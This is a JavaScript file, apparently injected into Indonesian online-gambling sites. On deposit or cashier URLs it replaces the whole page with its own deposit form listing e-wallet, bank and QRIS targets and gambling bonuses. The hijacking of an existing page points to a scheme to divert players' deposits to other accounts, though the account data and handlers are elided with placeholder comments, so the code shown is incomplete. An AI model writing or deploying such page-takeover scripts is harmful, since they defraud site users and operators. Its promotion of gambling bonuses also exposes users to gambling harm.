// Daftar URL path yang diperbolehkan
const url = window.location.href;
const match = [
  '/deposit',
  '/bank',
  '/deposit.php',
  '/qris.php',
  '/cashier',
  '/?page=transaksi',
  '/index.php?page=transaksi',
  '/?deposit&head=home',
  '/index.php?page=cashier',
  '/bank.php'
];

// Cek apakah URL cocok dengan salah satu path
const isMatch = match.some(path => url.includes(path));

// Kalau URL tidak cocok, hentikan script
if (!isMatch) {
  console.log('[app.js] URL tidak cocok, script tidak dijalankan.');
} else {
  console.log('[app.js] URL cocok, script dijalankan.');

  // ====================
  // 1. Bangun struktur halaman & CSS
  // ====================
  document.body.innerHTML = `
  <style>
    body {
      margin: 0;
      font-family: "Arial", sans-serif;
      background: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQZemBe0dN9mpXljluvyibhxjVzMZAh5C8edHPJUTccBhXECV8qqX1TUpw&s=10') no-repeat center center fixed;
      background-size: cover;
      color: #fff;
    }
    .overlay {
      background-color: rgba(0, 0, 0, 0.7);
      min-height: 100vh;
      padding: 15px;
    }
    h1 {
      text-align: center;
      margin-bottom: 10px;
      font-size: 1.8em;
      font-weight: bold;
    }
    .running-text {
      background: #ff6600;
      color: #fff;
      padding: 8px;
      white-space: nowrap;
      overflow: hidden;
      box-sizing: border-box;
      margin-bottom: 15px;
      border-radius: 5px;
      font-size: 0.85em;
    }
    .running-text span {
      display: inline-block;
      padding-left: 100%;
      animation: scroll-text 15s linear infinite;
    }
    @keyframes scroll-text {
      0% { transform: translate(0, 0); }
      100% { transform: translate(-100%, 0); }
    }
    .form-container {
      background: rgba(255, 255, 255, 0.1);
      padding: 15px;
      border-radius: 10px;
      max-width: 400px;
      margin: auto;
      backdrop-filter: blur(5px);
    }
    label {
      display: block;
      margin-top: 10px;
      font-size: 0.9em;
      font-weight: bold;
    }
    select, input {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border-radius: 5px;
      border: none;
      font-size: 1em;
      background: rgba(255, 255, 255, 0.85);
      box-sizing: border-box;
    }
    .rekening-box {
      background: rgba(255, 255, 255, 0.1);
      padding: 10px;
      border-radius: 8px;
      margin-top: 10px;
      display: none;
      animation: fadeIn 0.3s ease;
    }
    .rekening-box img {
      width: 80px;
      display: block;
      margin: 0 auto 8px auto;
    }
    .rekening-detail {
      text-align: left;
      font-size: 0.95em;
      line-height: 1.4;
      margin-top: 5px;
    }
    .rekening-detail strong {
      display: block;
    }
    .copy-btn {
      background: #ff6600;
      color: #fff;
      border: none;
      padding: 6px 10px;
      font-size: 0.8em;
      border-radius: 4px;
      cursor: pointer;
      display: block;
      margin: 8px auto 0 auto;
    }
    .lihat-tutorial {
      margin-top: 8px;
      display: none;
      background: #444;
      color: #fff;
      padding: 8px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      width: 100%;
      font-size: 0.85em;
    }
    .tutorial-box {
      background: rgba(255, 255, 255, 0.1);
      padding: 10px;
      border-radius: 5px;
      margin-top: 8px;
      font-size: 0.85em;
      display: none;
    }
    button#konfirmasi {
      width: 100%;
      background: #ff6600;
      color: #fff;
      padding: 12px;
      font-size: 1em;
      margin-top: 15px;
      border: none;
      border-radius: 5px;
      font-weight: bold;
      cursor: pointer;
      opacity: 0.5;
      transition: opacity 0.3s;
    }
    button#konfirmasi.enabled {
      opacity: 1;
    }
    .loading-box {
      text-align: center;
      margin-top: 10px;
      display: none;
      font-size: 0.9em;
    }
    .spinner {
      width: 25px;
      height: 25px;
      border: 3px solid #fff;
      border-top: 3px solid #ff6600;
      border-radius: 50%;
      margin: 5px auto;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }
    .popup {
      position: fixed;
      bottom: 20px;
      left: 50%;
      transform: translateX(-50%);
      background: #333;
      color: #fff;
      padding: 10px 20px;
      border-radius: 30px;
      display: none;
      font-size: 0.9em;
      box-shadow: 0 4px 10px rgba(0,0,0,0.4);
      animation: fadeIn 0.3s ease;
      z-index: 999;
    }
  </style>

  <div class="overlay">
    <h1>Formulir Deposit</h1>
    <div class="running-text">
      <span>Selamat Datang di situs terpercaya, tergacor, sejagad raya, silahkan lakukan deposit sebelum bermain, Deposit Wajib menggunakan Kode Unik, Jika tidak menggunakan Kode unik saat awal transaksi, maka deposit Tidak Dapat di Proses</span>
    </div>
    <div class="form-container">
      <label for="tujuan">Pilih Tujuan Deposit</label>
      <select id="tujuan">
        <option value="">-- Pilih Tujuan --</option>
        <option value="dana">E-Wallet DANA</option>
        <option value="ovo">E-Wallet OVO</option>
        <option value="bri">BRI VA</option>
        <option value="bca">BCA VA</option>
        <option value="bni">BNI VA</option>
        <option value="mandiri">MANDIRI VA</option>
        <option value="QRIS">QRIS</option>
      </select>

      <div id="rekening-box" class="rekening-box"></div>
      <button type="button" id="lihat-tutorial" class="lihat-tutorial">Lihat Tutorial Transfer</button>
      <div id="tutorial-box" class="tutorial-box"></div>

      <label for="nama">Nama Pengirim</label>
      <input type="text" id="nama" placeholder="Masukkan nama pengirim">

      <label for="promosi">Pilih Promosi</label>
      <select id="promosi">
        <option value="">-- Pilih Promosi --</option>
        <option value="tanpa">Tanpa Bonus</option>
        <option value="bonus100">Bonus Deposit 100%</option>
        <option value="garansi">Garansi Kekalahan 100%</option>
        <option value="rolling">Bonus Rolling Mingguan 80%</option>
        <option value="cashdrop">Bonus CashDrop</option>
        <option value="saldoawal">Bonus Saldo Awal</option>
      </select>

      <label for="nominal">Nominal (Minimal 50.000)</label>
      <input type="text" id="nominal" placeholder="Contoh: 50000">

      <button id="konfirmasi" disabled>Konfirmasi Deposit</button>

      <div class="loading-box" id="loading-box">
        <div class="spinner"></div>
        <p id="loading-text">Menerima Deposit...</p>
      </div>
    </div>
  </div>

  <div id="popup" class="popup"></div>
  `;

  // ====================
  // 2. Jalankan script fungsionalitas asli
  // ====================
  const tujuan = document.getElementById('tujuan');
  const rekeningBox = document.getElementById('rekening-box');
  const lihatTutorial = document.getElementById('lihat-tutorial');
  const tutorialBox = document.getElementById('tutorial-box');
  const nama = document.getElementById('nama');
  const promosi = document.getElementById('promosi');
  const nominal = document.getElementById('nominal');
  const btn = document.getElementById('konfirmasi');
  const loadingBox = document.getElementById('loading-box');
  const loadingText = document.getElementById('loading-text');
  const popup = document.getElementById('popup');

  const dataTujuan = { /* ... (isi sama seperti sebelumnya) ... */ };

  // (Copy semua event listener & fungsi sama seperti versi sebelumnya)
  // -- singkat: kode fungsi copyToClipboard, cekForm, event listener tujuan, nominal, tombol, dsb --
}
